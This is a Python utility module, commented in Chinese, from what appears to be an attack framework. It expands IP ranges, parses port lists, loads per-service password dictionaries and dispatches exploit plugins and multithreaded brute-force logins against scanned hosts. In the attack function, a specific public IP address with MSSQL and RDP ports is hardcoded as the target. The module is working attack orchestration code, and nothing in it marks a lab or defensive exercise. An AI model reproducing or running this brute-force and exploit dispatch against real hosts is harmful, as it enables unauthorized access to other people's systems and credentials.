#-*- coding:utf-8 -*-
from Libs.glo import *
logger = get_value('logger')

class Cidr:
    def __init__(self, ips):
        self.ips = ips

    def bin2ip(self, b):
        ip = ""
        for i in range(0, len(b), 8):
            ip += str(int(b[i:i + 8], 2)) + "."
        return ip[:-1]

    # convert a decimal number to binary representation
    # if d is specified, left-pad the binary number with 0s to that length
    def dec2bin(self, n, d=None):
        s = ""
        while n > 0:
            if n & 1:
                s = "1" + s
            else:
                s = "0" + s
            n >>= 1
        if d is not None:
            while len(s) < d:
                s = "0" + s
        if s == "": s = "0"
        return s

    # convert an IP address from its dotted-quad format to its
    # 32 binary digit representation
    def ip2bin(self, ip):
        b = ""
        inQuads = ip.split(".")
        outQuads = 4
        for q in inQuads:
            if q != "":
                b += self.dec2bin(int(q), 8)
                outQuads -= 1
        while outQuads > 0:
            b += "00000000"
            outQuads -= 1
        return b

    def listCIDR(self):
        cidrlist = []
        parts = self.ips.split("/")
        baseIP = self.ip2bin(parts[0])
        subnet = int(parts[1])
        # Python string-slicing weirdness:
        # "myString"[:-1] -> "myStrin" but "myString"[:0] -> ""
        # if a subnet of 32 was specified simply print the single IP
        if subnet == 32:
            print(self.bin2ip(baseIP))
        # for any other size subnet, print a list of IP addresses by concatenating
        # the prefix with each of the suffixes in the subnet
        else:
            ipPrefix = baseIP[:-(32 - subnet)]
            for i in range(2 ** (32 - subnet)):
                cidrlist.append(self.bin2ip(ipPrefix + self.dec2bin(i, (32 - subnet))))
            return cidrlist

def filesParse():
    filesPath = get_value('filesPath')
    q_ip = getQueue()
    with open(filesPath, 'rt') as f:
        for each in f.readlines():
            q_ip.put(each.strip())
    set_value('q_ip', q_ip)


# 获取一个队列
def getQueue():
    from queue import Queue
    q = Queue(-1)
    return q

# 复制队列
def copyQueue(q):
    from queue import Queue
    q2 = Queue(-1)
    L = []
    while not q.empty():
        L.append(q.get())
    for each in L:
        q.put(each)
        q2.put(each)
    return q2




# 将扫描端口结束后的IP存放到队列里  从{'123.125.115.109': ['80'], '123.125.115.110': ['80'], '123.125.115.111': ['80']}字典里获取IP
def probeServiceIpQueue():
    ipOpenPort = get_value('ipOpenPort')
    from queue import Queue
    q = Queue(-1)
    for _ in ipOpenPort.keys():
        q.put(_)
    return q


# 处理端口扫描的逻辑
def portParse():
    port = get_value('port')        # port：输入的端口命令，-p all ，-p 80,81,82  , -p 1-1024
    if port == 'all':
        ports_protocols = get_value('ports_protocols')
        ports = list(ports_protocols.keys())
    elif ',' in port:
        ports = port.split(',')  # ['80', '81', '82']
    elif '-' in port:
        ports = list(
            map(lambda x: str(x), range(int(port.split('-')[0]), int(port.split('-')[1]) + 1)))  # ['80', '81', '82']
    else:
        ports = [port]

    set_value('ports', ports)       # 将端口号存入全局变量里


# 检查服务是否可被爆破，可被爆破返回服务名字和密码字典名字，不可被爆破返回None
def checkBrustService(__service):
    pwdTxtsName = get_value('pwdTxtsName')
    for pwdTxtName in pwdTxtsName:
        if __service in pwdTxtName:
            return pwdTxtName
    return None

# 打开密码本，将密码存入全局变量里
def setGloPwdContent(pwdTXT):
    if not exist_key(pwdTXT):          # 如果密码本已经读取过一次内容就不再读取
        pwdContent = getQueue()         # 存放字典的队列
        with open('password/{}'.format(pwdTXT), 'rt') as f:
            for each in f.readlines():
                pwdContent.put(each.strip())
        set_value(pwdTXT, pwdContent)          # {'mysql.txt': ['111', '111', '1111']}
    else:
        pass
        # logger.info('全局变量已经存在{}'.format(pwdTxtName))


# 多线程爆破端口
def burstPortThread(Exp, ip, port, pwdTXT):
    threadNum = get_value('threadNum')
    q_pwd = get_value(pwdTXT)
    q_pwdCopy = copyQueue(q_pwd)            # 赋值密码队列
    threads = []
    for num in range(1, threadNum + 1):
        t = Exp(ip, port, q_pwdCopy)
        t.start()
        threads.append(t)
    for t in threads:
        t.join()


def attackMultiThread():
    from Libs.plugins import pluginInit
    # nmapResult = get_value('nmapResult')
    getcwd = get_value('getcwd')
    #print(nmapResult)
    # nmapResult = [{'127.0.0.1': {'3306': 'mysql', '80': 'http', '443': 'http'}}, {'127.0.0.2': {'3306': 'mysql', '80': 'http', '443': 'http'}}]
    nmapResult = [{'103.78.141.122': {'80': 'http', '1433': 'ms-sql-s', '3389': 'ms-wbt-server'}}]       # , '3389': 'ms-wbt-server'
    for each_ip in nmapResult:
        for ip in each_ip:
            ip = ip
            ports = each_ip[ip].keys()
            for port in ports:
                service = each_ip[ip][port]
                init = pluginInit(service)          # 初始化插件文件, 添加环境变量
                plugins = init.plugins              # 获取插件
                pwdTXT = service + '.txt'           # mysql.txt   mssql.txt
                if init.pwdExist(pwdTXT):           # 如果password目录有该密码本，返回True，否则返回None.
                    setGloPwdContent(pwdTXT)        # 读取密码内容存到全局变量里
                    # logger.info(get_value(pwdTXT))
                if plugins:
                    for plugin in plugins:              # 遍历插件
                        if init.pluginExist(plugin):
                            md = init.launch(plugin)
                            if hasattr(md, 'Exploit'):
                                Exp = getattr(md, 'Exploit')
                                if 'brust' in plugin:           # 爆破
                                    burstPortThread(Exp, ip, int(port), pwdTXT)
                                else:                           # 调用插件
                                    Exp(ip, int(port)).launch()
